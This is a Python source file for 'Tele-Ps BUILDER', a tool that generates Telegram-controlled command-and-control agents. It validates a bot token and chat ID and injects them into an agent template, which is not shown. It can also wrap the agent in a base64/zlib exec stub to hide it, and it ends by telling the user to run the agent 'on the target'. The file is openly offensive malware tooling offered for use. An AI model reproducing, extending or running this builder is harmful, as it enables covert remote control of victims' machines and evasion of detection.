#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#   Tele-Ps BUILDER - Telegram-C2 agent builder
#   No IP / no domain needed - uses only a Telegram bot.
#   Made by Abdelrahman
# ============================================================

import base64
import os
import re
import sys
import time
import zlib

try:
    import requests
except ImportError:
    sys.stderr.write("[-] builder.py requires 'requests' -> pip install -r requirements.txt\n")
    sys.exit(1)

HERE = os.path.dirname(os.path.abspath(__file__))
TEMPLATE = os.path.join(HERE, "template.py")
BUILDS = os.path.join(HERE, "builds")

BANNER = r"""
  __  __  ___  ____
 |  \/  |/ _ \|  _ \
 | |\/| | | | | |_) |
 | |  | | |_| |  __/
 |_|  |_|\___/|_|    v1.0
  Telegram-C2 agent builder
  Made by Abdelrahman
"""


def ask(prompt):
    return input(prompt).strip()


def validate_token(token):
    return bool(re.fullmatch(r"\d{6,12}:[A-Za-z0-9_-]{30,}", token))


def validate_chat_id(cid):
    cid = cid.strip()
    if cid.startswith("-100"):
        return cid[4:].isdigit() and len(cid) > 8
    return cid.lstrip("-").isdigit()


def test_token(token, chat_id):
    print("[*] Testing bot credentials against Telegram ...")
    try:
        me = requests.get("https://api.telegram.org/bot%s/getMe" % token, timeout=15).json()
        if not me.get("ok"):
            print("[-] Token rejected by Telegram: %s" % me.get("description", "unknown error"))
            return False
        bot = me["result"]
        print("[+] Bot OK -> @%s (%s)" % (bot.get("username"), bot.get("first_name")))
    except requests.exceptions.RequestException as e:
        print("[-] No internet to Telegram: %s" % e)
        return False
    try:
        r = requests.post(
            "https://api.telegram.org/bot%s/sendMessage" % token,
            data={"chat_id": chat_id, "text": "[+] Tele-Ps builder: credentials OK. Made by Abdelrahman"},
            timeout=15,
        ).json()
        if r.get("ok"):
            print("[+] Test message delivered to chat %s" % chat_id)
        else:
            print("[-] Token works but chat %s is not reachable: %s" % (chat_id, r.get("description")))
    except requests.exceptions.RequestException:
        print("[!] Could not send test message (check chat id / privacy settings)")
    return True


def build(token, chat_id, out_name=None):
    try:
        with open(TEMPLATE, "r", encoding="utf-8") as fh:
            code = fh.read()
    except OSError as e:
        print("[-] Cannot read template.py: %s" % e)
        sys.exit(1)
    code = code.replace("%%BOT_TOKEN%%", token).replace("%%CHAT_ID%%", chat_id)
    if out_name is None:
        out_name = "teleps_agent_%s.py" % time.strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(BUILDS, out_name)
    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write(code)
    os.chmod(out_path, 0o755)
    return out_path


def build_obfuscated(token, chat_id, out_name=None):
    try:
        with open(TEMPLATE, "r", encoding="utf-8") as fh:
            code = fh.read()
    except OSError as e:
        print("[-] Cannot read template.py: %s" % e)
        sys.exit(1)
    code = code.replace("%%BOT_TOKEN%%", token).replace("%%CHAT_ID%%", chat_id)
    payload = base64.b64encode(zlib.compress(code.encode("utf-8"), 9)).decode()
    stub = (
        "#!/usr/bin/env python3\n"
        "# -*- coding: utf-8 -*-\n"
        "# Made by Abdelrahman\n"
        "import base64, zlib, runpy, sys\n"
        "P=b'%s'\n"
        "exec(compile(zlib.decompress(base64.b64decode(P)),'<teleps>','exec'))\n"
    ) % payload
    if out_name is None:
        out_name = "teleps_agent_%s_obf.py" % time.strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(BUILDS, out_name)
    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write(stub)
    os.chmod(out_path, 0o755)
    return out_path


def main():
    print(BANNER)
    token = ask("[?] Telegram bot token (from @BotFather): ")
    if not validate_token(token):
        print("[-] Invalid bot token format (expected 123456789:AA...).")
        sys.exit(1)
    chat_id = ask("[?] Your Telegram chat ID (owner): ")
    if not validate_chat_id(chat_id):
        print("[-] Invalid chat ID (must be a number, e.g. 123456789 or -1001234567890).")
        sys.exit(1)
    if not test_token(token, chat_id):
        print("[-] Aborting: credentials failed validation.")
        sys.exit(1)
    mode = ask("[?] Build mode [1] plain, [2] obfuscated (default 1): ").strip() or "1"
    os.makedirs(BUILDS, exist_ok=True)
    if mode == "2":
        out = build_obfuscated(token, chat_id)
    else:
        out = build(token, chat_id)
    print("[+] Agent written -> %s" % out)
    print("[+] Done. Run it on the target with:  python3 %s" % os.path.basename(out))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Aborted by user.")
        sys.exit(1)
